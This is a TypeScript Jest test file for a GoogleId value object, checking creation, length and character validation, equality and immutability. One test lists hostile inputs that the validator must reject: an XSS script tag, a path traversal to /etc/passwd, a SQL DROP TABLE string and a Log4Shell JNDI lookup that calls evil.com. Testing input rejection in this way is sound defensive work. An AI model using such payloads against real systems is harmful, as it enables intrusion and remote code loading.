import { GoogleId } from '../google-id';

describe('GoogleId Value Object', () => {
  const validGoogleId = '123456789012345678901';

  describe('create', () => {
    it('should create GoogleId with valid Google ID string', () => {
      const googleId = GoogleId.create(validGoogleId);

      expect(googleId.toString()).toBe(validGoogleId);
    });

    it('should throw error for null Google ID', () => {
      expect(() => GoogleId.create(null as any)).toThrow(
        'Google ID cannot be null or undefined'
      );
    });

    it('should throw error for undefined Google ID', () => {
      expect(() => GoogleId.create(undefined as any)).toThrow(
        'Google ID cannot be null or undefined'
      );
    });

    it('should throw error for empty Google ID', () => {
      expect(() => GoogleId.create('')).toThrow('Google ID cannot be empty');
    });

    it('should throw error for whitespace-only Google ID', () => {
      expect(() => GoogleId.create('   ')).toThrow('Google ID cannot be empty');
    });

    it('should throw error for Google ID that is too short', () => {
      expect(() => GoogleId.create('12345')).toThrow(
        'Google ID must be between 10 and 50 characters'
      );
    });

    it('should throw error for Google ID that is too long', () => {
      const longId = 'a'.repeat(51);
      expect(() => GoogleId.create(longId)).toThrow(
        'Google ID must be between 10 and 50 characters'
      );
    });

    it('should throw error for Google ID with invalid characters', () => {
      expect(() => GoogleId.create('invalid@#$%^&*()')).toThrow(
        'Google ID contains invalid characters'
      );
    });

    it('should accept Google ID with minimum valid length', () => {
      const minLengthId = '1234567890'; // 10 characters
      const googleId = GoogleId.create(minLengthId);

      expect(googleId.toString()).toBe(minLengthId);
    });

    it('should accept Google ID with maximum valid length', () => {
      const maxLengthId = '12345678901234567890123456789012345678901234567890'; // 50 characters
      const googleId = GoogleId.create(maxLengthId);

      expect(googleId.toString()).toBe(maxLengthId);
    });

    it('should accept Google ID with alphanumeric characters', () => {
      const alphanumericId = 'abc123def456ghi789';
      const googleId = GoogleId.create(alphanumericId);

      expect(googleId.toString()).toBe(alphanumericId);
    });
  });

  describe('equals', () => {
    it('should return true for GoogleIds with same value', () => {
      const googleId1 = GoogleId.create(validGoogleId);
      const googleId2 = GoogleId.create(validGoogleId);

      expect(googleId1.equals(googleId2)).toBe(true);
    });

    it('should return false for GoogleIds with different values', () => {
      const googleId1 = GoogleId.create('123456789012345678901');
      const googleId2 = GoogleId.create('987654321098765432109');

      expect(googleId1.equals(googleId2)).toBe(false);
    });

    it('should return false for null or undefined', () => {
      const googleId = GoogleId.create(validGoogleId);

      expect(googleId.equals(null as any)).toBe(false);
      expect(googleId.equals(undefined as any)).toBe(false);
    });

    it('should return false for non-GoogleId objects', () => {
      const googleId = GoogleId.create(validGoogleId);

      expect(googleId.equals('123456789012345678901' as any)).toBe(false);
      expect(googleId.equals({ value: validGoogleId } as any)).toBe(false);
    });

    it('should be case sensitive', () => {
      const googleId1 = GoogleId.create('abc123def456');
      const googleId2 = GoogleId.create('ABC123DEF456');

      expect(googleId1.equals(googleId2)).toBe(false);
    });
  });

  describe('toString', () => {
    it('should return the Google ID string', () => {
      const googleId = GoogleId.create(validGoogleId);

      expect(googleId.toString()).toBe(validGoogleId);
    });
  });

  describe('validation rules', () => {
    it('should validate Google ID format according to Google specifications', () => {
      // Based on Google OAuth documentation, Google IDs are typically numeric strings
      const numericGoogleId = '123456789012345678901';
      const googleId = GoogleId.create(numericGoogleId);

      expect(googleId.toString()).toBe(numericGoogleId);
    });

    it('should reject Google IDs with special characters commonly used in attacks', () => {
      const maliciousIds = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}',
      ];

      maliciousIds.forEach((maliciousId) => {
        expect(() => GoogleId.create(maliciousId)).toThrow(
          'Google ID contains invalid characters'
        );
      });
    });

    it('should maintain immutability', () => {
      const googleId = GoogleId.create(validGoogleId);
      const originalValue = googleId.toString();

      // Value objects should be immutable - no way to change internal state
      expect(googleId.toString()).toBe(originalValue);
    });
  });
});
